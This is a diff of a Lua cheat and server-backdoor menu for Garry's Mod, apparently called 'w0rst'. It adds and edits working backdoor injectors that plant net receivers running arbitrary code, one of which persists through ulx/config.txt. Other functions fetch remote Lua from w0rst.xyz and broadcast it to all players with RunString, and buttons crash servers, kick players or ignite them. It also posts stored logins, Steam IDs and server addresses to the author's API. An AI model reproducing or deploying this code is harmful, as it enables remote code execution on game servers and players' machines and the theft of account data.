@@ -48,7 +48,8 @@ wtf.enable = {
     ['Bhop'] = false,
     ['FreeCamera'] = false,
     ['SpectatorList'] = false,
-    ['SilentLock'] = false
+    ['SilentLock'] = false,
+    ['RainbowColors'] = false
 }
 
 wtf.color = {
@@ -117,11 +118,12 @@ local function Relay()
 
     local lp = LocalPlayer()
     local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
-    http.Post("https://w0rst.xyz/api/relay.php", {
-        username=UserInfo[1],
-        password=UserInfo[2],
-        steam_name=lp:Name(),
-        steam_id=lp:SteamID(),
+    http.Post("https://w0rst.xyz/project/api/relay.php", {
+        user=UserInfo[1],
+        pass=UserInfo[2],
+        name=lp:Name(),
+        id=lp:SteamID(),
+        id64=lp:SteamID(),
         server_name=GetHostName(),
         server_ip=game.GetIPAddress() }, function(b)
         local s = string.Split(b, " ");
@@ -216,13 +218,13 @@ function Log(str)
 end
 
 local Icons = {
-    V="https://w0rst.xyz/script/images/visuals.png",
-    P="https://w0rst.xyz/script/images/players.png",
-    B="https://w0rst.xyz/script/images/backdoor.png",
-    M="https://w0rst.xyz/script/images/misc.png",
-    S="https://w0rst.xyz/script/images/sounds.png",
-    A="https://w0rst.xyz/script/images/aimbot.png",
-    E="https://w0rst.xyz/script/images/exploits.png"
+    V="https://w0rst.xyz/project/images/visuals.png",
+    P="https://w0rst.xyz/project/images/players.png",
+    B="https://w0rst.xyz/project/images/backdoor.png",
+    M="https://w0rst.xyz/project/images/misc.png",
+    S="https://w0rst.xyz/project/images/sounds.png",
+    A="https://w0rst.xyz/project/images/aimbot.png",
+    E="https://w0rst.xyz/project/images/exploits.png"
 }
 
 local Materials = {}
@@ -871,22 +873,22 @@ local function CreateBDClient(name, func)
 end
 
 local Sounds = {
-    "Velvet https://w0rst.xyz/script/sounds/egovert-velvet.mp3",
-    "MrMoney https://w0rst.xyz/script/sounds/shotgunwilly-mrmoney.mp3",
-    "GoLoko https://w0rst.xyz/script/sounds/tyga-goloko.mp3",
-    "BadBoy https://w0rst.xyz/script/sounds/yungbae-badboy.mp3",
-    "RooDoo https://w0rst.xyz/script/sounds/bbno$-roodoo.mp3",
-    "SingleSummer https://w0rst.xyz/script/sounds/gyyps-singleforthesummer.mp3",
-    "Quiting https://w0rst.xyz/script/sounds/khary-quitting.mp3",
-    "DoubtIt https://w0rst.xyz/script/sounds/kyle-doubtit.mp3",
-    "Hex https://w0rst.xyz/script/sounds/80purp-hex.mp3",
-    "DownBad https://w0rst.xyz/script/sounds/jcole-downbad.mp3",
-    "JustTheTwoOfUs https://w0rst.xyz/script/sounds/groverwashington-justthetwoofus.mp3",
-    "StillCreeping https://w0rst.xyz/script/sounds/chuuwee-still-creeping.mp3",
-    "BeLazy https://w0rst.xyz/script/sounds/skizzymars-be-lazy.mp3",
-    "Hope https://w0rst.xyz/script/sounds/Hope.mp3",
-    "Prices https://w0rst.xyz/script/sounds/prices.mp3",
-    "51DeadOps https://w0rst.xyz/script/sounds/51deadops.mp3"
+    "Velvet https://w0rst.xyz/project/sounds/egovert-velvet.mp3",
+    "MrMoney https://w0rst.xyz/project/sounds/shotgunwilly-mrmoney.mp3",
+    "GoLoko https://w0rst.xyz/project/sounds/tyga-goloko.mp3",
+    "BadBoy https://w0rst.xyz/project/sounds/yungbae-badboy.mp3",
+    "RooDoo https://w0rst.xyz/project/sounds/bbno$-roodoo.mp3",
+    "SingleSummer https://w0rst.xyz/project/sounds/gyyps-singleforthesummer.mp3",
+    "Quiting https://w0rst.xyz/project/sounds/khary-quitting.mp3",
+    "DoubtIt https://w0rst.xyz/project/sounds/kyle-doubtit.mp3",
+    "Hex https://w0rst.xyz/project/sounds/80purp-hex.mp3",
+    "DownBad https://w0rst.xyz/project/sounds/jcole-downbad.mp3",
+    "JustTheTwoOfUs https://w0rst.xyz/project/sounds/groverwashington-justthetwoofus.mp3",
+    "StillCreeping https://w0rst.xyz/project/sounds/chuuwee-still-creeping.mp3",
+    "BeLazy https://w0rst.xyz/project/sounds/skizzymars-be-lazy.mp3",
+    "Hope https://w0rst.xyz/project/sounds/Hope.mp3",
+    "Prices https://w0rst.xyz/project/sounds/prices.mp3",
+    "51DeadOps https://w0rst.xyz/project/sounds/51deadops.mp3"
 }
 
 for i = 1, #Sounds do
@@ -1099,22 +1101,21 @@ HookFunc("AltHUDPaint", VisualHook, function()
                     for k, v in pairs(wtf.Bones) do
                         if ent:LookupBone(v) ~= nil and ent:GetBonePosition(ent:LookupBone(v)) ~= nil then
                             table.insert(Bones, ent:GetBonePosition(ent:LookupBone(v)):ToScreen())
-                        else Continue=false; return end
+                        else Continue=false return end
                     end
 
-                    if Continue then
-                        surface.SetDrawColor(wtf.color['Skeleton'])
-                        surface.DrawLine(Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y); surface.DrawLine(Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y)
-                        surface.DrawLine(Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y); surface.DrawLine(Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y)
-                        surface.DrawLine(Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y); surface.DrawLine(Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y)
-                        surface.DrawLine(Bones[7].x, Bones[7].y, Bones[14].x, Bones[14].y); surface.DrawLine(Bones[14].x, Bones[14].y, Bones[15].x, Bones[15].y)
-                        surface.DrawLine(Bones[15].x, Bones[15].y, Bones[16].x, Bones[16].y); surface.DrawLine(Bones[16].x, Bones[16].y, Bones[17].x, Bones[17].y)
-                        surface.DrawLine(Bones[7].x, Bones[7].y, Bones[18].x, Bones[18].y); surface.DrawLine(Bones[18].x, Bones[18].y, Bones[19].x, Bones[19].y)
-                        surface.DrawLine(Bones[19].x, Bones[19].y, Bones[20].x, Bones[20].y); surface.DrawLine(Bones[20].x, Bones[20].y, Bones[21].x, Bones[21].y)
-                        surface.DrawLine(Bones[3].x, Bones[3].y, Bones[8].x, Bones[8].y); surface.DrawLine(Bones[8].x, Bones[8].y, Bones[9].x, Bones[9].y)
-                        surface.DrawLine(Bones[9].x, Bones[9].y, Bones[10].x, Bones[10].y); surface.DrawLine(Bones[3].x, Bones[3].y, Bones[11].x, Bones[11].y)
-                        surface.DrawLine(Bones[11].x, Bones[11].y, Bones[12].x, Bones[12].y); surface.DrawLine(Bones[12].x, Bones[12].y, Bones[13].x, Bones[13].y)
-                    end
+                    if not Continue then return end
+                    surface.SetDrawColor(wtf.color['Skeleton'])
+                    surface.DrawLine(Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y); surface.DrawLine(Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y)
+                    surface.DrawLine(Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y); surface.DrawLine(Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y)
+                    surface.DrawLine(Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y); surface.DrawLine(Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y)
+                    surface.DrawLine(Bones[7].x, Bones[7].y, Bones[14].x, Bones[14].y); surface.DrawLine(Bones[14].x, Bones[14].y, Bones[15].x, Bones[15].y)
+                    surface.DrawLine(Bones[15].x, Bones[15].y, Bones[16].x, Bones[16].y); surface.DrawLine(Bones[16].x, Bones[16].y, Bones[17].x, Bones[17].y)
+                    surface.DrawLine(Bones[7].x, Bones[7].y, Bones[18].x, Bones[18].y); surface.DrawLine(Bones[18].x, Bones[18].y, Bones[19].x, Bones[19].y)
+                    surface.DrawLine(Bones[19].x, Bones[19].y, Bones[20].x, Bones[20].y); surface.DrawLine(Bones[20].x, Bones[20].y, Bones[21].x, Bones[21].y)
+                    surface.DrawLine(Bones[3].x, Bones[3].y, Bones[8].x, Bones[8].y); surface.DrawLine(Bones[8].x, Bones[8].y, Bones[9].x, Bones[9].y)
+                    surface.DrawLine(Bones[9].x, Bones[9].y, Bones[10].x, Bones[10].y); surface.DrawLine(Bones[3].x, Bones[3].y, Bones[11].x, Bones[11].y)
+                    surface.DrawLine(Bones[11].x, Bones[11].y, Bones[12].x, Bones[12].y); surface.DrawLine(Bones[12].x, Bones[12].y, Bones[13].x, Bones[13].y)
                 end
 
                 if wtf.enable['Box3D'] then
@@ -1234,9 +1235,17 @@ HookFunc("CalcView", ViewHook, function(ply, pos, angles, fov)
 end)
 
 HookFunc("Think", ThinkHook, function()
-    if not wtf.enable['PhysRainbow'] then return end
-    local rainbow = HSVToColor((CurTime() * 12) % 360, 1, 1)
-    LocalPlayer():SetWeaponColor(Vector(rainbow.r / 255, rainbow.g / 255, rainbow.b / 255))
+    if wtf.enable['PhysRainbow'] then 
+        local rainbow = HSVToColor((CurTime() * 12) % 360, 1, 1)
+        LocalPlayer():SetWeaponColor(Vector(rainbow.r / 255, rainbow.g / 255, rainbow.b / 255))
+    end
+
+    if wtf.enable['RainbowColors'] then 
+        for k, v in pairs(wtf.color) do 
+            local rainbow = HSVToColor((CurTime() * 42) % 360, 1, 1)
+            wtf.color[k] = Color(rainbow.r, rainbow.g, rainbow.b)
+        end
+    end
 end)
 
 HookFunc("CreateMove", BhopHook, function(ply) 
@@ -1418,6 +1427,15 @@ CreateCheckbox("Spectator List", VisualsTab[1], 142, 100, function()
     end
 end)
 
+CreateCheckbox("Rainbow Colors", VisualsTab[1], 262, 100, function()
+    wtf.enable['RainbowColors'] = not wtf.enable['RainbowColors']
+    if wtf.enable['RainbowColors'] then
+        Log("Rainbow Colors Enabled")
+    else
+        Log("Rainbow Colors Disabled")
+    end
+end)
+
 CreateButton("Refresh Ents", VisualsTab[1], 80, 25, 15, 160, EntityList.Clear)
 
 local function SaveVisuals()
@@ -1443,18 +1461,38 @@ CreateButton("Save Visuals", MiscTab[1], 80, 25, 425, 250, SaveVisuals)
 
 CreateButton("Load Visuals", MiscTab[1], 80, 25, 340, 250, LoadVisuals)
 
+CreateBDServer("File-Backdoor (ULX-Extended)", function()
+    Log("Added/Injected Backdoor")
+    SendLua([[
+        util.AddNetworkString('w0rst') net.Receive('w0rst', function(len) RunString(net.ReadString()) end) 
+        file.Append("ulx/config.txt", "\n"..[=[ulx hook Think wtf hmm "util.AddNetworkString('w0rst') net.Receive('w0rst', function() RunString(net.ReadString()) end) hook.Remove('Think', 'wtf')"]=])
+    ]])
+end)
+
+CreateBDServer("Inject-Backdoor (Custom)", function()
+    Log("Backdoor Added")
+    CreateInputBox("Net Name", function(str)
+        SendLua([[
+            util.AddNetworkString(']]..str..[[')
+            net.Receive(']]..str..[[', function(len) 
+                RunString(net.ReadString()) 
+            end)
+        ]])
+    end)
+end)
+
 CreateBDServer("WMenu-Memento", function()
-    http.Fetch('https://w0rst.xyz/script/extra/wgamefucker', function(b) SendLua(b) end)
+    http.Fetch('https://w0rst.xyz/project/func/extras/wmemento.lua', function(b) SendLua(b) end)
     Log("??? wgamefucker ???")
 end)
 
 CreateBDServer("Satan is (LoRd)", function()
-    http.Fetch('https://w0rst.xyz/script/extra/jumpscare', function(b) SendLua(b) end)
+    http.Fetch('https://w0rst.xyz/project/func/extras/goatscare.lua', function(b) SendLua(b) end)
     Log("oaooooh so spooky !")
 end)
 
 CreateBDServer("Satan's Depths", function()
-    SendLua([[BroadcastLua("http.Fetch('https://w0rst.xyz/script/extra/hellmode', RunString)")]])
+    SendLua([[BroadcastLua("http.Fetch('https://w0rst.xyz/project/func/extras/hellmode.lua', RunString)")]])
     Log("everyones in ~-hell!~")
 end)
 
@@ -1589,16 +1627,6 @@ CreateBDServer("Crash Server", function()
     Log("Server Downed")
 end)
 
-CreateBDServer("Add-Backdoor", function()
-    Log("Server-STD Added")
-    SendLua([[
-        util.AddNetworkString('w0rst')
-        net.Receive('w0rst', function(len) 
-            RunString(net.ReadString()) 
-        end)
-    ]])
-end)
-
 CreateBDServer("Announcement", function()
     CreateInputBox("Announce", function(str)
         SendLua("for k, v in pairs(player.GetAll()) do v:PrintMessage(HUD_PRINTCENTER, \""..str.."\") end")
@@ -1638,7 +1666,7 @@ CreateBDServer("Kick Everyone", function()
     end)
 end)
 
-CreateBDServer("Retry All", function()
+CreateBDServer("Retry Everyone", function()
     Log("Everyone Retry'd")
     SendLua([[
         local LP = ]]..LocalPlayer():UserID()..[[
@@ -1799,7 +1827,7 @@ CreateBDClient("Add Eco", function()
 end)
 
 CreateBDClient("Ignite", function()
-    Log("Everyone Ignited")
+    Log("Ignited "..SelectedPlr)
     SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:Ignite(9999999,9999999)
@@ -1807,7 +1835,7 @@ CreateBDClient("Ignite", function()
 end)
 
 CreateBDClient("Extinguish", function()
-    Log("Everyone Extinguished")
+    Log("Extinguished "..SelectedPlr)
     SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:Extinguish()
@@ -1911,7 +1939,7 @@ CreateBDClient("NoClip",  function()
 end)
 
 CreateButton("Net-Scan", BackdoorTab[1], 115, 30, 19, 520, function()
-    http.Post("https://w0rst.xyz/api/net/view.php", { A0791AfFA0F30EdCee1EdADb = "02C2C6A1Ded7183AeDAA8650" }, function(b)
+    http.Post("https://w0rst.xyz/project/api/netsys.php", { method = "02C2C6A1Ded7183AeDAA8650" }, function(b)
         local Nets = string.Split(b, " ")
         for k, v in pairs(Nets) do
             if CheckNet(v) then
@@ -1936,7 +1964,7 @@ end)
 CreateButton("Add-Net", BackdoorTab[1], 115, 30, 259, 520, function()
     CreateInputBox("Net", function(str)
         local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
-        http.Post("https://w0rst.xyz/api/net/upload.php", { username=UserInfo[1], password=UserInfo[2], net=str }, function(b)
+        http.Post("https://w0rst.xyz/project/api/netsys.php", { method = "A0791AfFA0F30EdCee1EdADb", u = UserInfo[1], p = UserInfo[2], n = str }, function(b)
             if b[1] == "0" then
                 Log("Uploaded Net "..str)
             elseif b[1] == "1" then
@@ -1984,7 +2012,7 @@ CreateButton("Net-Dumper", MiscTab[1], 110, 25, 142, 10, function()
 end)
 
 CreateButton("w0rst-backdoor", MiscTab[1], 110, 25, 262, 10, function()
-    MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm', RunString) end)\n")
+    MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/project/func/napalm.lua', RunString) end)\n")
     Log("Check Console")
 end)
 
@@ -2088,5 +2116,3 @@ CreateButton("Stop Sounds", SoundsTab[1], 120, 35, 255, 520, function()
     SendLua([[for k,v in pairs(player.GetAll()) do v:ConCommand('stopsound') end]])
     Log("Stopped Sounds")
 end)
-
---/ http.Fetch("https://w0rst.xyz/script/load", RunString)
